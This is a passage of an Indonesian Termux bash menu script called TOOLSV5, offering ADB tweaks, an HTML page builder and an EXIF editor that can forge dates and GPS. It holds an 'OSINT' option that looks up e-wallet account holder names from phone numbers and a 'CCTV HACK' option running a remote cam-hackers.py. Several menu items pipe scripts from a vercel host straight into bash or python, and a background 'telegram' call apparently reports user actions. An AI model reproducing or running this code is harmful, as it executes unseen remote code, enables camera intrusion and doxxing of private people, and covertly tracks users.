e $q $b "[$k 4$b ]$p HAPUS DATA APK ( WARNING )"
e $q $b "[$k 0$b ]$p EXIT$m"
IFS= read -r -e -p " Choose (0-4) : " pi
case $pi in
1)
e $q $k "You chose option 1"
sleep 2
e $q $k "Starting Signal 9 configuration"
sleep 3
adb shell "/system/bin/device_config set_sync_disabled_for_tests persistent"
adb shell "/system/bin/device_config put activity_manager max_phantom_processes 2147483647"
adb shell settings put global settings_enable_monitor_phantom_procs false
result=$(adb shell "/system/bin/device_config get activity_manager max_phantom_processes")
if [ "$result" == "2147483647" ]; then
e $q $h "Signal 9 configuration applied successfully!"
IFS= read -r -e -p "Silahkan ENTER untuk Kembali"
else
e $q $m "Signal 9 configuration failed!"
IFS= read -r -e -p "Silahkan ENTER untuk Kembali"
fi
;;
2)
clear
banner
adb shell pm list packages
$e
IFS= read -r -e -p "Apk Mana Yang Ingin Anda Nonaktifkan Dari Hp : " oposu
adb shell pm uninstall --user 0 $oposu
clear
banner
e $h "Success ! Silahkan Cek Di Home Device Anda !$m"
IFS= read -r -e -p "Silahkan ENTER untuk Masuk Ke Menu"
;;
3)
clear
banner
IFS= read -r -e -p "Masukkan Package Yang Ingin Anda Kembalikan : " opo
adb shell cmd package install-existing $opo
e $h "Silahkan Anda Cek Di Home Device "
sleep 3
IFS= read -r -e -p " ENTER untuk Kembali Ke Menu"
;;
4)
e="\e"
bg_h="\e[48;5;82m"
bg_m="\e[48;5;88m"
bg_k="\e[48;5;88m"
bg_b="\e[48;5;24m"
m="\e[1m"
res="\e[0m"
clear
banner
e $bg_h "Menampilkan daftar paket yang terpasang di perangkat...$res"
adb shell pm list packages
e $bg_m "Masukkan nama paket aplikasi yang ingin dihapus cache-nya (satu per satu).$res"
e $bg_k "Setelah selesai, ketik 'n' untuk berhenti dan melanjutkan.$res"
e $m "Contoh: com.example.app1$res"
e $bg_h "Masukkan nama paket aplikasi:"
> list.txt
while true; do
IFS= read -r -e -p "Masukkan nama paket aplikasi: " package
if [ -n "$package" ]; then
echo "$package" >> list.txt
e $bg_h "Paket $package telah ditambahkan ke list.$res"
fi
IFS= read -r -e -p "Apakah Anda ingin menambahkan paket lain? (Y/n): " yn
if [[ ! $yn =~ ^[Yy]$ ]]; then
break
fi
done
e $bg_b "Menghapus cache untuk aplikasi yang terdaftar dalam list.txt...$res"
while read package; do
if [ -n "$package" ]; then
echo "Menghapus cache untuk aplikasi: $package"
adb shell pm clear $package
fi
done < list.txt
e $bg_h "Cache untuk aplikasi yang terdaftar telah berhasil dihapus.$res"
IFS= read -r -e -p "ENTER untuk kembali ke Menu"
;;
0)
e $q $k "You Choose Exit"
sleep 1
e $q $h "Subscribe my Channel"
termux-open "https://www.youtube.com/@GalirusProjects"
sleep 2
break
;;
*) e $q $m "Input Failed" ;;
esac
;;
0)
e $q $k "You Choose Exit"
sleep 1
e $q $h "Subscribe my Channel"
termux-open "https://www.youtube.com/@GalirusProjects"
sleep 2
break
;;
*) e $q $m "Input Failed" ;;
esac
done
}
ADB_DEBUGGING
elif [ "$no" = "37" ]; then
cek_akses
blacklist() {
local nomor_input="$1"
local nomor_blacklist="085850268349"
if [[ "$nomor_input" == "$nomor_blacklist" ]]; then
echo "Nomor $nomor_input diblokir (blacklist)."
return 1
else
echo "Nomor $nomor_input tidak ada dalam blacklist."
return 0
fi
}
osint_name_pake_nomor() {
ACCOUNT_NUMBER="$nomor"
BANKS=("ovo" "dana" "linkaja" "gopay" "shopeepay")
spinner() {
local pid=$1
local delay=0.1
local spinstr='|/-\'
while kill -0 "$pid" 2> /dev/null; do
for i in $(seq 0 3); do
printf "\r${ran4}%s${ran7} Loading..." "${spinstr:i:1}"
sleep $delay
done
done
printf "\r"
}
output=""
for BANK in "${BANKS[@]}"; do
output+="${ran3}Checking account for $BANK${ran7}\n"
TMPFILE=$(mktemp)
curl -s -X POST "https://cekrekening-api.belibayar.online/api/v1/account-inquiry" \
-H "Content-Type: application/json" \
-d "{\"account_bank\": \"$BANK\", \"account_number\": \"$ACCOUNT_NUMBER\"}" > "$TMPFILE" 2>&1 &
curl_pid=$!
spinner "$curl_pid"
wait "$curl_pid"
RESPONSE=$(cat "$TMPFILE")
rm -f "$TMPFILE"
if echo "$RESPONSE" | jq empty 2> /dev/null; then
SUCCESS=$(echo "$RESPONSE" | jq -r '.success')
MESSAGE=$(echo "$RESPONSE" | jq -r '.message')
ACCOUNT_HOLDER=$(echo "$RESPONSE" | jq -r '.data.account_holder')
output+="${ran2}Status       : $MESSAGE${ran7}\n"
if [[ -n $ACCOUNT_HOLDER && $ACCOUNT_HOLDER != "null" && $ACCOUNT_HOLDER != "" ]]; then
output+="${ran2}Nama Akun    : $ACCOUNT_HOLDER${ran7}\n"
else
output+="${ran2}Nama Akun    : (tidak tersedia)${ran7}\n"
fi
else
output+="${ran1}[Error] Response bukan JSON valid:${ran7}\n$RESPONSE\n"
fi
output+="-----------------------------------------\n"
done
max_length=0
while IFS= read -r line; do
clean_line=$(echo -e "$line" | sed 's/\x1b\[[0-9;]*m//g')
len=${#clean_line}
((len > max_length)) && max_length=$len
done <<< "$(echo -e "$output")"
max_length=$((max_length + 2))
echo -e "┌$(printf '─%.0s' $(seq 1 $max_length))┐"
while IFS= read -r line; do
clean_line=$(echo -e "$line" | sed 's/\x1b\[[0-9;]*m//g')
padding=$((max_length - ${#clean_line} - 1))
printf "│ %b%*s│\n" "$line" "$padding" ""
done <<< "$(echo -e "$output")"
echo -e "└$(printf '─%.0s' $(seq 1 $max_length))┘"
}
banner_osint() {
echo "
⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃⠀⠀  ⠀⠀[ TOOLSV5 ]⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇ DEVELOPMENT GALIRUS OFFICIAL
l0===[]================> OSINT EWALLET & NAME⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
}
banner() {
banner_osint | lolcat
e "$m Ketik EXIT jika mau keluar$ran8"
}
while true; do
clear
banner
IFS= read -r -e -p "Masukkan Nomor 08xxx: " nomor
if [[ "$nomor" = "exit" || "$nomor" = "EXIT" ]]; then
break 2
fi
if blacklist "$nomor"; then
osint_name_pake_nomor
else
echo "Proses dihentikan karena nomor diblokir."
fi
echo " Silahkan Enter Untuk Kembali Ke Menu"
read
done
elif [ "$no" = "38" ]; then
banner() {
echo "
██████╗██████╗ ███████╗ █████╗ ████████╗███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝
██║     ██████╔╝█████╗  ███████║   ██║   █████╗
██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝
╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗
╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ html
AUTHOR    : GALIRUS OFFICIAL
WEBSITE   : https://www.ppprogresif.com/galirus-official
DEVELOPER : TOOLSV5 X GALIRUS OFFICIAL
"
}
menu() {
echo -e " menu : "
echo -e " 1.Galirus Html (1) "
echo -e " 2.Galirus Html (2) "
echo -e " 0. BACK TO TOOLSV5 "
echo
}
GALIRUS_OFFICIAL() {
IFS= read -r -e -p "Masukkan link url (background belakang): " url_background
IFS= read -r -e -p "Masukkan Nama Author: " Author
IFS= read -r -e -p "Masukkan link url ( logo ): " logo
IFS= read -r -e -p "Masukkan Quotes Teks Mu (sad / apa lah): " qoutes
IFS= read -r -e -p "Masukkan Url music (tidak support yt): " url_music
output_file="/storage/emulated/0/HASIL_HTML_GALIRUS_OFFICIAL.html"
cat << EOF > "$output_file"
<!DOCTYPE html>
<html lang="en">
<head>
<meta property="og:title" content="GalirusProjects">
<link href="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png" rel="icon" type="image/x-icon">
<meta property="og:image" content="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png">
<meta http-equiv="cache-control" content="index,cache">
<meta http-equiv="pragma" content="index,cache">
<meta name="keywords" content="GalirusProjects">
<meta charset="utf-8"
<title>Galirus Official</title>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet">
<style type="text/css">
html {
background-image: url($url_background);
background-position: center;
background-size: cover;
background-attachment: fixed;
color: #fff;
text-align: center;
font-family: "Kelly Slab", sans-serif;
margin: 0;
font-weight: 60;
height: 60vh;
transition: background-image 1s ease-in-out;
}
body, font, .button-like, .footer-greetings marquee {
text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
}
.button-like {
display: inline-block;
padding: 15px 25px;
background-color: #3498db;
color: #ffffff;
font-size: 2.2em;
border: 2px solid #2980b9;
border-radius: 15px;
margin: 10px;
text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
}
.fade-img {
width: 700px;
opacity: 1;
animation: fadeEffect 5s infinite alternate;
}
@keyframes fadeEffect {
0% { opacity: 0.2; }
100% { opacity: 1; }
}
</style>
</head>
<body>
<div id="homePage">
<br>
<font size="3" color="white">Author By : </font><font size="6" color="red">$Author</font><br><br><br>
<i><br>
<img title="GalirusProjects" src="$logo" class="fade-img"><br>
<font size="10" color="red">Hello Saya $Author</font><br><br>
<hr>
<div id="typing-effect" style="font-size: 1.5em; color: white; font-weight: bold; padding: 20px;"></div>
<script>
const text = "$qoutes";
let index = 0;
function typeWriter() {
if (index < text.length) {
document.getElementById("typing-effect").innerHTML += text.charAt(index);
index++;
setTimeout(typeWriter, 100);
}
}
typeWriter();
</script>
<a href="#" onclick="showStore(); return false;" class="button-like">TOOLSV5</a>
<a href="https://wa.me/p/8709692955788033/6285850268349" class="button-like">BUY</a>
<a href="https://bc683363-58f1-458c-94d0-27201448688a-00-3mgocbzgj74ut.sisko.replit.dev/chat" class="button-like">ROOM CHAT</a>
</i>
<br><hr><br>
<div class="footer-greetings">
<marquee><font size="4" color="red"><b>THANK YOU FOR</b>: </font><font size="5" color="white">ALLAH X GALIRUS OFFICIAL X TOOLSV5</font></marquee>
</div>
<hr><br>
<audio controls autoplay loop src="$url_music"></audio>
</div>
</body>
</html>
EOF
clear
echo "File HTML berhasil dibuat di: $output_file"
IFS= read -r -e -p "Silahkan ENTER untuk masuk ke menu"
}
LAIN() {
IFS= read -r -e -p "Masukkan link url (background belakang): " url_background
IFS= read -r -e -p "Masukkan Nama Author: " Author
IFS= read -r -e -p "Masukkan link url ( logo ): " logo
IFS= read -r -e -p "Masukkan Quotes Teks Mu (sad / apa lah): " qoutes
IFS= read -r -e -p "Masukkan Url ( yt channel mu ) :" url_yt
IFS= read -r -e -p "Masukkan Url ( akun Tiktok mu ) :" url_tiktok
IFS= read -r -e -p "Masukkan Url ( grup WhatsApp ) :" url_Grup
IFS= read -r -e -p "Nama Grup ( yang akan di tampilkan ) : " nama_grup
IFS= read -r -e -p "Pesan Untuk di sebelah ( THANKS YOU FOR ): " apa
IFS= read -r -e -p "Masukkan Url music (tidak support yt): " url_music
output_file="/storage/emulated/0/HASIL_HTML_GALIRUS_OFFICIAL(2).html"
cat << EOF > "$output_file"
<html>
<head>
<meta property="og:title" content="GalirusProjects">
<link href="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png" rel="icon" type="image/x-icon">
<meta property="og:image" content="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png">
<meta http-equiv="cache-control" content="index,cache">
<meta http-equiv="pragma" content="index,cache">
<meta name="keywords" content="GalirusProjects">
<meta charset="utf-8">
<title>Galirus Official</title>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet">
<script src="" type="text/javascript"></script>
<script src="" type="text/javascript"></script>
<script src="" type="text/javascript"></script>
</head>
<body>
<style type="text/css">
html {
background-image: url($url_background );
background-repeat: no-repeat;
background-position: center;
background-size: cover;
background-attachment: fixed;
height: auto;
width: auto;
background-color: #ffffff;
color: #fff;
text-align: center;
font-family: "Kelly Slab", sans serif;
margin: 0;
font-weight: 60;
height: 60vh;
}
.button-like {
display: inline-block;
padding: 10px 20px;
background-color: #3498db; /* Warna latar belakang */
color: #ffffff; /* Warna teks */
border: 2px solid #2980b9; /* Warna border */
border-radius: 15px;
}
</style>
<br>
<embed src="https://youtu.be/AnMhdn0wJ4I&autoplay=1&start=0" type="application/x-shockwave-flash" wmode="transparent" width="0" height="0"></embed>
</div>
</body>
</html>
<br><br>
<font size="3" color="white">Author By : </font><font size="6" color="red">$Author</font><br><br><br>
<img title="GalirusProjects" src="$logo" width="400"><br>
<i><br>
<font size="7" color="red">Hello Saya $Author</font><br><hr><br>
<font size="5" color="white">$qoutes</font><br><hr><br>
<font size="3" color="yellow"></font><br><hr>
<a href="$url_yt"><div size="20" class="button-like">YouTube</div></a>
<a href="$url_tiktok"><div size="20" class="button-like">Tiktok</div></a><br><br>
<a href="https://fnofzyyubhbh7sdbgzzjva.on.drv.tw/galirus/script.html"><div size="20" class="button-like">Script Termux</div></a>
<a href="$url_Grup"><div size="10" class="button-like">$nama_grup</div></a>
<br>
<br>
<hr><div size="10" class="footer-greetings"><marquee><font size="4" color="red">
<b>THANKS YOU FOR  </b> : </font><font size="5" color="white">$apa</font></font></marquee></div></td></table>
<hr><br>
<audio controls="controls" autoplay="true" loop="loop" src="$url_music"></audio>
</i>
<script>
(function(){var js = "window['__CF$cv$params']={r:'78a1663cfc30a129',m:'sl3IEuXNd0z8F8YSz4F3eb3XwlW4RftE7A7BId1PsDk-1673814942-0-AamVfHbcq9F6shk5OM5kzb7NyaLIsUnzKDtwnKXWqumUVCdcgQv67PXV7w3MTSXWkl+8nPWqGuCflljw9EmsPAQ0U/YtYOfTC1W2MS9hsWv9WeWQiiFbNdvC/gjZ6gve/qM70/7WHkz/rAaSnX9DIOA=',s:[0xac1da4f42d,0x08725e79da],u:'/cdn-cgi/challenge-platform/h/g'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/h/g/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();
</script>
</body>
</html>
EOF
clear
echo "File HTML berhasil dibuat di: $output_file"
IFS= read -r -e -p "Silahkan ENTER untuk masuk ke menu"
}
while true; do
clear
banner | lolcat
menu | lolcat
IFS= read -r -e -p "Silahkan Pilih (1 -2) :" mana
if [ "$mana" = "1" ]; then
clear
banner | lolcat
GALIRUS_OFFICIAL
elif [ "$mana" = "2" ]; then
clear
banner | lolcat
LAIN
elif [ "$mana" = "0" ]; then
break
else
echo -e "Pilihan Tidak Valid"
fi
done
elif [ "$no" = "39" ]; then
if ! command -v exiftool &> /dev/null; then
echo "ExifTool tidak ditemukan. Instal dengan menjalankan:"
$paket install exiftool -y
fi
banner() {
echo -e "███████╗██╗  ██╗██╗███████╗
██╔════╝╚██╗██╔╝██║██╔════╝
█████╗   ╚███╔╝ ██║█████╗
██╔══╝   ██╔██╗ ██║██╔══╝
███████╗██╔╝ ██╗██║██║
╚══════╝╚═╝  ╚═╝╚═╝╚═╝   TOOLS By.Galirus Official
"
}
show_menu() {
echo "====================================="
echo "EXIF Metadata Editor (Kompatibel Termux)"
echo "====================================="
echo "1. Ubah Tanggal (DateTimeOriginal, CreateDate, ModifyDate)"
echo "2. Ubah Judul (Title)"
echo "3. Ubah Artis (Artist)"
echo "4. Tambah Lokasi GPS"
echo "5. Ubah Deskripsi (Description)"
echo "6. Ubah Copyright (Hak Cipta)"
echo "7. Ubah Nama Kamera"
echo "8. Hapus Metadata"
echo "9. Lihat Metadata"
echo "10. Keluar"
}
read_file() {
IFS= read -r -e -p "Masukkan path file (contoh: /storage/emulated/0/Download/foto.jpg): " file
if [ ! -f "$file" ]; then
echo "File tidak ditemukan: $file"
exit 1
fi
}
update_date() {
read_file
IFS= read -r -e -p "Masukkan tanggal baru (format: YYYY:MM:DD HH:MM:SS): " date
exiftool -DateTimeOriginal="$date" -CreateDate="$date" -ModifyDate="$date" "$file"
echo "Tanggal berhasil diubah!"
}
update_title() {
read_file
IFS= read -r -e -p "Masukkan judul baru: " title
exiftool -Title="$title" "$file"
echo "Judul berhasil diubah!"
}
update_artist() {
read_file
IFS= read -r -e -p "Masukkan nama artis baru: " artist
exiftool -Artist="$artist" "$file"
echo "Artis berhasil diubah!"
}
add_gps() {
read_file
IFS= read -r -e -p "Masukkan Latitude (contoh: 37.7749): " latitude
IFS= read -r -e -p "Masukkan Longitude (contoh: -122.4194): " longitude
IFS= read -r -e -p "Masukkan Altitude (opsional, contoh: 15.0): " altitude
exiftool -GPSLatitude="$latitude" -GPSLongitude="$longitude" -GPSAltitude="$altitude" "$file"
echo "Lokasi GPS berhasil ditambahkan!"
}
update_description() {
read_file
IFS= read -r -e -p "Masukkan deskripsi baru: " description
exiftool -ImageDescription="$description" "$file"
echo "Deskripsi berhasil diubah!"
}
update_copyright() {
read_file
IFS= read -r -e -p "Masukkan hak cipta baru: " copyright
exiftool -Copyright="$copyright" "$file"
echo "Copyright berhasil diubah!"
}
update_camera_name() {
read_file
IFS= read -r -e -p "Masukkan nama kamera baru: " camera
exiftool -Model="$camera" "$file"
echo "Nama kamera berhasil diubah!"
}
remove_metadata() {
read_file
exiftool -all= "$file"
echo "Semua metadata berhasil dihapus!"
}
view_metadata() {
read_file
exiftool "$file"
}
while true; do
clear
banner | lolcat
show_menu | lolcat
IFS= read -r -e -p "Pilih opsi (1-10): " choice
case $choice in
1)
update_date
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
2)
update_title
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
3)
update_artist
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
4)
add_gps
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
5)
update_description
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
6)
update_copyright
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
7)
update_camera_name
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
8)
remove_metadata
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
9)
view_metadata
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
10)
echo "Keluar dari program."
break
;;
*)
echo "Pilihan tidak valid. Coba lagi."
sleep 3
;;
esac
done
elif [ "$no" = "40" ]; then
cek_akses
clear
cowsay -f eyes "INSTALLASI PACKAGE" | lolcat
pip install requests
pip install colorama
pip install random
while true; do
clear
isipesan="Terdeteksi Menjalankan Menu All CCTV HACK"
telegram &> /dev/null &
python3 <(curl -sL "https://kontollukecilkocak.vercel.app/cam-hackers.py")
e "$g404" "Silahkan Enter"
read
clear
cowsay -f eyes "HELLO BOY" | lolcat
echo -e $g404 "Apakah Anda Ingin Mengulanginya ? y/n"
IFS= read -r -e -p "Masukkan Pilihan Anda: " apa
if [[ $apa == "N" || $apa == "n" ]]; then
break
fi
done
elif [[ $no == "bk" || $no == "BK" ]]; then
break
elif [ "$no" = "0" ]; then
touch $PREFIX/tmp/.tools
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null
kill_sound &> /dev/null &
cd $HOME
isipesan="Terdeteksi Keluar Dari TOOLSV5 !  💻"
telegram &> /dev/null &
exit 0
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res "
play -q $HOME/Lubeban/sound/input_salah.mp3 &> /dev/null &
sleep 5
fi
done
elif [[ $no == "BOT" || $no == "bot" ]]; then
while true; do
isipesan="Terdeteksi Masuk Ke BOTZ ! 👨‍💻"
telegram &> /dev/null &
TAMPILANTOOLSV5
BOTZ
READ
if [[ $no == "bot1" || $no == "BOT1" ]]; then
cek_akses
default="$PREFIX/.kontol"
file="$default/arsip.tar.xz"
mkdir -p "$default"
while true; do
if [ -f "$default/index.js" ]; then
cd "$default"
while true; do
IFS= read -r -e -p "Apakah anda ingin menghapus sessions sebelumnya? (y/n): " jawab
case "$jawab" in
[Yy]*)
echo "▶ Menghapus session lama..."
rm -rf session
mkdir -p session
echo "✅ Session baru sudah dibuat."
break
;;
[Nn]*)
echo "❎ Session lama tidak dihapus."
break
;;
*)
echo "⚠ Jawaban tidak valid. Silakan ketik y atau n."
;;
esac
done
npm start
break
else
echo "▶ Mengunduh arsip..."
wget -q --show-progress -O "$file" \
"https://raw.githubusercontent.com/WatashiSenseiGalirus/.bot/main/arsip.tar.xz"
echo "▶ Mengekstrak arsip..."
tar -xJf "$file" -C "$default"
echo "✅ Ekstraksi selesai."
fi
done
elif [[ $no == "bk" || $no == "BK" ]]; then
break
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res "
play -q $HOME/Lubeban/sound/input_salah.mp3 &> /dev/null &
sleep 5
fi
done
elif [[ $no == "ENC" || $no == "enc" ]]; then
while true; do
isipesan="Terdeteksi Masuk Ke PROMOSI_BERBAYAR ! 👨‍💻"
telegram &> /dev/null &
TAMPILANTOOLSV5
ENC
READ
if [ "$no" = "1" ]; then
bash <(curl -sL "https://kontollukecilkocak.vercel.app/mayan5.sh")
IFS= read -r -e -p "ENTER UNTUK KEMBALI KE TOOLSV5"
elif [ "$no" = "2" ]; then
python <(curl -sL "https://kontollukecilkocak.vercel.app/lambda.py")
IFS= read -r -e -p "ENTER UNTUK KEMBALI KE TOOLS"
elif [[ $no == "bk" || $no == "BK" ]]; then
break
elif [ "$no" = "0" ]; then
touch $PREFIX/tmp/.tools
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null
kill_sound &> /dev/null &
cd $HOME
isipesan="Terdeteksi Keluar Dari TOOLSV5 !  💻"
telegram &> /dev/null &
exit 0
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res "
play -q $HOME/Lubeban/sound/input_salah.mp3 &> /dev/null &
sleep 5
fi
done
elif [[ $no == "sc+" || $no == "SC+" ]]; then
cek_akses
if [[ -f $HOME/.jarvis_terpasang ]]; then
e $ran8 "
Penjelasan Script Tambahan di TOOLSV5
Setelah kamu menginstal TOOLSV5 beserta script tambahan
kamu akan mendapatkan 3 perintah utama yang siap digunakan di Termux, yaitu:
1. gal
Fungsi: Perintah ini digunakan untuk mendownload video
dari URL YouTube dan TikTok.
Cara kerja: Kamu cukup menjalankan perintah gal diikuti dengan link video
yang ingin diunduh, maka script ini akan
secara otomatis mengambil video tersebut
dan menyimpannya di perangkatmu.
2. mpvtube
Fungsi: Perintah ini berfungsi untuk memutar video YouTube langsung di Termux.
Cara kerja: Dengan menjalankan
perintah mpvtube diikuti URL video YouTube
video akan diputar menggunakan pemutar video berbasis terminal (mpv)
tanpa perlu membuka aplikasi YouTube secara terpisah.
3. jarvis
Fungsi: Ini adalah perintah untuk menjalankan JARVIS AI
sebuah asisten AI yang dapat kamu gunakan di Termux.
Cara kerja: Setelah menjalankan jarvis
kamu bisa berinteraksi dengan AI ini melalui teks
mirip seperti asisten virtual yang membantu berbagai kebutuhanmu.
Kesimpulan
Ketiga script ini adalah perintah siap pakai
yang memperluas kemampuan TOOLSV5.
Kamu hanya perlu mengetik gal, mpvtube, atau jarvis di Termux
untuk menjalankan fungsi masing-masing.
Semua sudah terinstall otomatis sebagai bagian
dari paket tambahan TOOLSV5.
terimakasih sudah membeli
toolsv5 semoga kalian bisa nyaman menggunakan toolsv5 selalu
sekian dari saya ADMIN TOOLSV5 mengucapkan
TERIMAKASIH
$c Silahkan ENTER jika sudah membacanya
"
read
else
EOF_MENU &> /dev/null &
$GALIRUS update && $GALIRUS upgrade
$GALIRUS install neofetch curl jq git ossp-uuid -y
$GALIRUS install ncurses-utils xz-utils nodejs -y
$GALIRUS install nodejs-lts python python3 -y
$GALIRUS install openssl bc boxes openssl-tool -y
npm -g i bash-obfuscate
pip install rich rich-cli
cd $HOME
touch $HOME/.jarvis_terpasang
git clone --depth 32 https://github.com/Lubebansokhekel/JARVISV3
cd JARVISV3
curl -sL -k -o "$PREFIX/bin/jarvis" "https://raw.githubusercontent.com/Lubebansokhekel/spamweb/main/public/JARVISV3.sh" &> /dev/null | e $h "Sabar Admin sedang Mendownlod JARVIS$res"
chmod +x "$PREFIX/bin/jarvis"
curl -sL -k -o "$HOME/.Hina_AI" "https://od.lk/s/NzNfOTQ3OTY4MTlf/gemini" &> /dev/null | e $h "Sabar Admin sedang Memasangkan Apikey$res"
jarvis
fi
elif [[ $no == "del" || $no == "DEL" ]]; then
clear
while true; do
clear
$banner | lolcat
e " FITUR INI UNTUK MENGHAPUS SEMUA\n SCRIPT YANG TERKAIT DENGAN TOOLSV5$res" | lolcat
e " JADI APA ANDA TETAP INGIN MELANJUTKANNYA ?$res"$h | lolcat
total_size=0
for item in "${list[@]}"; do
if [ -e "$item" ]; then
size=$(du -sb "$item" 2> /dev/null | awk '{print $1}')
total_size=$((total_size + size))
fi
done
human_readable_size=$(du -shc "${list[@]}" 2> /dev/null | tail -n 1 | awk '{print $1}')
e $c "Total ukuran$h:$m $human_readable_size$k"
IFS= read -r -e -p "Apakah Anda yakin ingin menghapus semua file ini? (y/n): " confirm
if [[ $confirm == "y" || $confirm == "Y" ]]; then
echo "Memulai Proses Hapus Mohon Bersabar..."
for item in "${list[@]}"; do
rm -rf "$item"
done
echo "Penghapusan Selesai. Kembali ke toolsv5."
else
echo "Penghapusan dibatalkan."
sleep 3
break
fi
done
elif [[ $no == "musik" || $no == "MUSIK" ]]; then
cek_akses
clear
bannermusic() {
echo "
███╗   ███╗██╗   ██╗███████╗██╗██╗  ██╗
████╗ ████║██║   ██║██╔════╝██║██║ ██╔╝
██╔████╔██║██║   ██║███████╗██║█████╔╝
██║╚██╔╝██║██║   ██║╚════██║██║██╔═██╗
██║ ╚═╝ ██║╚██████╔╝███████║██║██║  ██╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝ setting to play
"
}
while true; do
clear
play -q $HOME/Lubeban/sound/robot.mp3 &> /dev/null &
bannermusic | lolcat
echo
e $h " 1.$k Setting MUSIK$res"
e $h " 2.$k Default TOOLSV5!$res"
e $m $bg_b" 0.BACK TO TOOLSV5$res$k"
$e
IFS= read -r -e -p "  Choose ( 0 - 2 ) : " mana
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
if [ "$mana" = "1" ]; then
cd $filenya
nano "$soundnya"
musikrun &> /dev/null &
elif [ "$mana" = "2" ]; then
cp -r $HOME/Lubeban/music.txt $filenya
